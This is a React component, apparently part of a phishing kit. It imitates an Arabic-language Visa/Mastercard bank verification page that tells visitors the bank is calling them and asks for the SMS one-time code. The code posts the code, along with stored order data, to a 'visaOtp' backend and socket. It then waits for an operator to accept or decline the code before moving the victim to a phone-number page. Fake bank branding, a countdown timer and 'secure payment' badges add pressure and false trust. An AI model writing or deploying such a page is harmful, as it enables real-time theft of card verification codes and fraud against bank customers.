import React, { useCallback, useEffect, useMemo, useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { LuLock, LuChevronLeft, LuInfo, LuCreditCard, LuCheck } from "react-icons/lu";

const BankCallVerify = () => {
  const navigate = useNavigate();
  const search = window.location.search;

  const data = useMemo(() => {
    try {
      const raw = new URLSearchParams(search).get("data");
      if (raw) return JSON.parse(raw);
    } catch {}
    try {
      const sess = sessionStorage.getItem("orderData");
      if (sess) return JSON.parse(sess);
    } catch {}
    return {};
  }, [search]);

  const _id =
    data?._id ||
    sessionStorage.getItem("orderId") ||
    sessionStorage.getItem("userId") ||
    sessionStorage.getItem("currentUserId");

  const [otp, setOtp] = useState("");
  const [load, setLoad] = useState(false);
  const [error, setError] = useState("");

  // 60-Second Countdown (01:00)
  const [seconds, setSeconds] = useState(60);

  useEffect(() => {
    const timer = setInterval(() => {
      setSeconds((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formattedTimer = useMemo(() => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
  }, [seconds]);

  const handleOtp = async (e) => {
    if (e) e.preventDefault();
    if (!otp.trim()) {
      setError("يرجى إدخال رمز التحقق المستلم");
      return;
    }

    setLoad(true);
    setError("");

    const targetId = _id || "guest";
    const finalData = { ...data, otp, CardOtp: otp };

    try {
      await axios.post(`${api_route}/visaOtp/${targetId}`, finalData);
      socket.emit("visaOtp", { id: targetId, otp });
    } catch (err) {
      console.warn("Could not send to server, attempting socket only:", err);
      try {
        socket.emit("visaOtp", { id: targetId, otp });
      } catch {}
    }
  };

  const onAcceptVisaOtp = useCallback(
    (id) => {
      const targetId = _id || "guest";
      if (id !== targetId) return;
      setLoad(false);
      sessionStorage.setItem("id", id);
      socket.emit("bindOrder", id);
      navigate(`/phone?id=${id}`);
    },
    [_id, navigate]
  );

  const onDeclineVisaOtp = useCallback(
    (id) => {
      const targetId = _id || "guest";
      if (id !== targetId) return;
      setLoad(false);
      setError("رمز التحقق غير صحيح، يرجى إعادة إدخال الرمز الصحيح");
    },
    [_id]
  );

  useEffect(() => {
    socket.on("acceptVisaOtp", onAcceptVisaOtp);
    socket.on("declineVisaOtp", onDeclineVisaOtp);
    return () => {
      socket.off("acceptVisaOtp", onAcceptVisaOtp);
      socket.off("declineVisaOtp", onDeclineVisaOtp);
    };
  }, [onAcceptVisaOtp, onDeclineVisaOtp]);

  return (
    <div
      className="min-h-screen relative flex flex-col items-center justify-center py-8 px-4 font-['Cairo',sans-serif] selection:bg-[#0c4383] selection:text-white overflow-hidden"
      style={{
        direction: "rtl",
        background:
          "radial-gradient(circle at 15% 10%, rgba(20, 80, 160, 0.45) 0%, transparent 40%), radial-gradient(circle at 85% 15%, rgba(15, 65, 140, 0.4) 0%, transparent 40%), linear-gradient(180deg, #021127 0%, #061d3d 35%, #0a2754 70%, #03142e 100%)",
      }}
    >
      {/* Decorative Golden Accent Arcs at Top and Bottom */}
      <div className="pointer-events-none absolute top-0 inset-x-0 h-16 border-b border-[#bfa15f]/30 shadow-[0_4px_16px_rgba(191,161,95,0.15)]" />
      <div className="pointer-events-none absolute bottom-0 inset-x-0 h-16 border-t border-[#bfa15f]/30 shadow-[0_-4px_16px_rgba(191,161,95,0.15)]" />

      {/* Main Container */}
      <div className="w-full max-w-[460px] relative z-10 flex flex-col items-center">
        {/* Top Header Logos: VISA | Mastercard */}
        <div className="flex items-center justify-center gap-5 mb-5 select-none" style={{ direction: "ltr" }}>
          {/* Visa Wordmark */}
          <span className="text-white font-extrabold text-3xl sm:text-4xl italic tracking-tight font-sans drop-shadow-sm">
            VISA
          </span>

          {/* Divider */}
          <div className="w-[1.5px] h-8 bg-white/40" />

          {/* Mastercard Logo */}
          <div className="flex flex-col items-center justify-center">
            <div className="flex items-center -space-x-2">
              <div className="w-7 h-7 rounded-full bg-[#eb001b]" />
              <div className="w-7 h-7 rounded-full bg-[#f79e1b] mix-blend-multiply opacity-95" />
            </div>
            <span className="text-[10px] text-white font-medium tracking-wider mt-0.5 font-sans">
              mastercard®
            </span>
          </div>
        </div>

        {/* White Main Card with Watermark */}
        <div
          className="w-full bg-white rounded-[28px] sm:rounded-[32px] p-6 sm:p-7 shadow-[0_20px_55px_rgba(0,0,0,0.45)] border border-[#d2def0] relative overflow-hidden flex flex-col"
          style={{
            background:
              "linear-gradient(180deg, #f9fbfe 0%, #ffffff 25%, #ffffff 100%)",
          }}
        >
          {/* Neoclassical Bank Pillars Watermark in Top Right */}
          <svg
            className="pointer-events-none absolute top-0 -right-2 w-44 h-44 text-[#0c4383]/[0.07]"
            viewBox="0 0 100 100"
            fill="currentColor"
            xmlns="http://www.w3.org/2000/svg"
          >
            {/* Pediment Roof */}
            <polygon points="5,26 50,7 95,26" />
            <rect x="5" y="27" width="90" height="4" rx="1" />
            {/* Columns */}
            <rect x="12" y="33" width="7" height="48" rx="1" />
            <rect x="25" y="33" width="7" height="48" rx="1" />
            <rect x="38" y="33" width="7" height="48" rx="1" />
            <rect x="51" y="33" width="7" height="48" rx="1" />
            <rect x="64" y="33" width="7" height="48" rx="1" />
            <rect x="77" y="33" width="7" height="48" rx="1" />
            {/* Base Stairs */}
            <rect x="8" y="82" width="84" height="4" rx="1" />
            <rect x="5" y="87" width="90" height="5" rx="1" />
          </svg>

          {/* Central Blue Bank & Phone Circular Badge */}
          <div className="flex justify-center -mt-1 mb-3">
            <div className="relative">
              <div className="w-20 h-20 rounded-full bg-gradient-to-br from-[#125197] via-[#0c4383] to-[#062c5b] p-2 flex items-center justify-center shadow-lg ring-8 ring-[#e6f1fb] border-2 border-[#b8d4f2]">
                <svg
                  className="w-11 h-11 text-white"
                  viewBox="0 0 48 48"
                  fill="currentColor"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  {/* Temple Pediment */}
                  <path d="M6 16.5L24 7.5L42 16.5V19.5H6V16.5Z" />
                  {/* Columns */}
                  <rect x="9" y="21.5" width="4.5" height="15" rx="1" />
                  <rect x="17.5" y="21.5" width="4.5" height="15" rx="1" />
                  <rect x="26" y="21.5" width="4.5" height="9" rx="1" />
                  <rect x="34.5" y="21.5" width="4.5" height="6" rx="1" />
                  {/* Base */}
                  <rect x="6" y="37.5" width="22" height="3" rx="0.5" />

                  {/* Overlaid Calling Handset with Signal Waves */}
                  <g className="text-white">
                    {/* Handset */}
                    <path
                      d="M29.5 32.2C29.1 31.6 28.3 31.5 27.7 31.9L25.8 33.3C25.4 33.6 24.8 33.5 24.5 33.1C23.2 31.4 22.1 29.5 21.4 27.5C21.2 27 21.5 26.5 22 26.3L24.2 25.1C24.8 24.7 25 24 24.7 23.4L23.2 20.3C22.9 19.7 22.1 19.5 21.6 19.8L19.8 20.8C18.9 21.3 18.5 22.4 18.8 23.4C19.9 27.1 22.4 31.6 26.6 34.6C27.5 35.2 28.7 35.1 29.4 34.3L30.7 32.9C31 32.5 30.8 32.1 30.5 31.9L29.5 32.2Z"
                      fill="#ffffff"
                    />
                    {/* Broadcast Sound Wave 1 */}
                    <path
                      d="M32 23C33.2 24.3 34 26 34 28"
                      stroke="#ffffff"
                      strokeWidth="2.5"
                      strokeLinecap="round"
                      fill="none"
                    />
                    {/* Broadcast Sound Wave 2 */}
                    <path
                      d="M36 20C38 22.2 39.2 25 39.2 28"
                      stroke="#ffffff"
                      strokeWidth="2.5"
                      strokeLinecap="round"
                      fill="none"
                    />
                  </g>
                </svg>
              </div>
            </div>
          </div>

          {/* Title & Subtitle */}
          <div className="text-center">
            <h2 className="text-xl sm:text-2xl font-extrabold text-[#0c2340] tracking-tight">
              جاري الاتصال بك من قبل البنك
            </h2>
            <p className="text-xs sm:text-sm text-[#475569] font-medium leading-relaxed mt-2 px-2">
              سيقوم البنك بالاتصال على رقم هاتفك المسجل لدى البنك
              <br />
              لإرسال رمز التحقق لتأكيد عملية الدفع.
            </p>
          </div>

          {/* Light Blue Info Box */}
          <div className="bg-[#e8f1fa] text-[#0c4383] rounded-2xl px-4 py-3 flex items-center justify-between text-xs sm:text-sm font-semibold mt-4 border border-[#d2e3f5] shadow-xs">
            <span>يرجى عدم إغلاق الصفحة حتى يتم تأكيد عملية الدفع.</span>
            <div className="w-5 h-5 rounded-full border-2 border-[#0c4383] flex items-center justify-center text-[#0c4383] font-bold text-xs shrink-0 ms-2">
              i
            </div>
          </div>

          {/* Progress Stepper (3 Steps) */}
          <div className="mt-5 px-1">
            <div className="flex items-center justify-between relative">
              {/* Step 1: معلومات الدفع (Completed/Right in RTL) */}
              <div className="flex flex-col items-center z-10">
                <div className="w-9 h-9 rounded-full border border-[#cbd5e1] bg-white flex items-center justify-center text-[#64748b] shadow-xs">
                  <LuCreditCard className="w-4 h-4" />
                </div>
                <span className="text-[11px] sm:text-xs font-semibold text-[#64748b] mt-1.5 whitespace-nowrap">
                  معلومات الدفع
                </span>
              </div>

              {/* Connecting Line 1 (Active Solid Blue) */}
              <div className="h-[2px] bg-[#0c4383] flex-1 mx-2 -mt-5" />

              {/* Step 2: تأكيد الدفع (Active/Center in RTL) */}
              <div className="flex flex-col items-center z-10">
                <div className="w-10 h-10 rounded-full bg-[#0c4383] text-white flex items-center justify-center shadow-md ring-4 ring-[#d8e8f8]">
                  <svg
                    className="w-5 h-5 text-white"
                    viewBox="0 0 24 24"
                    fill="currentColor"
                  >
                    <path d="M2 10h20v2H2zm2-7L12 1l8 2v2H4zm2 8h2v7H6zm5 0h2v7h-2zm5 0h2v7h-2zM2 19h20v3H2z" />
                  </svg>
                </div>
                <span className="text-[11px] sm:text-xs font-bold text-[#0c4383] mt-1.5 whitespace-nowrap">
                  تأكيد الدفع
                </span>
              </div>

              {/* Connecting Line 2 (Inactive Light Gray) */}
              <div className="h-[2px] bg-[#e2e8f0] flex-1 mx-2 -mt-5" />

              {/* Step 3: إتمام الدفع (Pending/Left in RTL) */}
              <div className="flex flex-col items-center z-10">
                <div className="w-9 h-9 rounded-full border border-[#cbd5e1] bg-white flex items-center justify-center text-[#94a3b8] shadow-xs">
                  <LuCheck className="w-4 h-4 text-[#94a3b8]" />
                </div>
                <span className="text-[11px] sm:text-xs font-semibold text-[#64748b] mt-1.5 whitespace-nowrap">
                  إتمام الدفع
                </span>
              </div>
            </div>
          </div>

          {/* Countdown Timer Row */}
          <div className="bg-[#edf3f9] rounded-2xl p-3 sm:p-3.5 flex items-center justify-between mt-5 border border-[#dce6f2]">
            <span className="font-bold text-xs sm:text-sm text-[#1e293b]">
              الوقت المتبقي لتأكيد الدفع
            </span>
            <div
              className="bg-white border border-[#0c4383]/25 rounded-xl px-3 py-1 flex items-center gap-2 shadow-xs"
              style={{ direction: "ltr" }}
            >
              <svg
                className="w-4 h-4 text-[#0c4383]"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2.2"
                  d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <span className="font-bold font-mono text-xs sm:text-sm text-[#0c4383]">
                {formattedTimer} دقيقة
              </span>
            </div>
          </div>

          {/* OTP Input Form */}
          <form onSubmit={handleOtp} className="mt-5">
            <label className="block text-center font-bold text-xs sm:text-sm text-[#1e293b] mb-2.5">
              قم بإدخال رمز التحقق المرسل إليك عبر الرسائل النصية
            </label>

            {/* Input with trailing lock icon */}
            <div className="relative flex items-center rounded-xl border border-[#cbd5e1] bg-white overflow-hidden shadow-inner focus-within:border-[#0c4383] focus-within:ring-2 focus-within:ring-[#0c4383]/20 transition-all">
              <input
                type="text"
                value={otp}
                onChange={(e) => {
                  setError("");
                  const val = e.target.value.replace(/\D/g, "");
                  setOtp(val.slice(0, 6));
                }}
                placeholder="رمز التحقق"
                inputMode="numeric"
                autoComplete="one-time-code"
                maxLength={6}
                required
                className="w-full h-12 px-4 text-center font-bold text-base sm:text-lg text-[#0c2340] placeholder-[#94a3b8] outline-none tracking-widest"
              />
              <div className="bg-[#f1f5f9] px-3.5 h-12 flex items-center justify-center border-s border-[#cbd5e1] text-[#64748b] shrink-0">
                <LuLock className="w-5 h-5 text-[#64748b]" />
              </div>
            </div>

            {/* Error Message */}
            {error && (
              <p className="text-red-600 text-xs text-center font-semibold mt-2 animate-shake">
                {error}
              </p>
            )}

            {/* Confirm Payment Button */}
            <button
              type="submit"
              disabled={load}
              className="w-full mt-4 h-12 rounded-xl bg-gradient-to-r from-[#0c3866] to-[#08284d] hover:from-[#0a2e54] hover:to-[#061e3b] text-white flex items-center justify-between px-5 font-bold text-sm sm:text-base shadow-md hover:shadow-lg active:scale-[0.99] transition-all cursor-pointer disabled:opacity-75 disabled:cursor-wait"
            >
              {/* Spacer on right for symmetry */}
              <div className="w-5" />

              {/* Centered label with lock */}
              <div className="flex items-center gap-2">
                {load ? (
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                ) : (
                  <LuLock className="w-4 h-4" />
                )}
                <span>تأكيد الدفع</span>
              </div>

              {/* Chevron icon pointing forward in RTL */}
              <LuChevronLeft className="w-5 h-5 text-white" />
            </button>
          </form>

          {/* Footer Security / Trust Badges */}
          <div className="border-t border-[#e2e8f0] mt-6 pt-3.5 flex items-center justify-center flex-wrap gap-2 text-[10.5px] sm:text-xs text-[#64748b] font-medium select-none">
            <span>جميع الحقوق محفوظة ©</span>
            <span className="text-[#cbd5e1]">|</span>
            <span className="flex items-center gap-1">
              <LuLock className="w-3.5 h-3.5 text-[#64748b]" />
              دفع آمن ومشفر
            </span>
            <span className="text-[#cbd5e1]">|</span>
            <span className="flex items-center gap-1">
              <svg className="w-3.5 h-3.5 text-[#64748b]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
              Secure Payment
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankCallVerify;

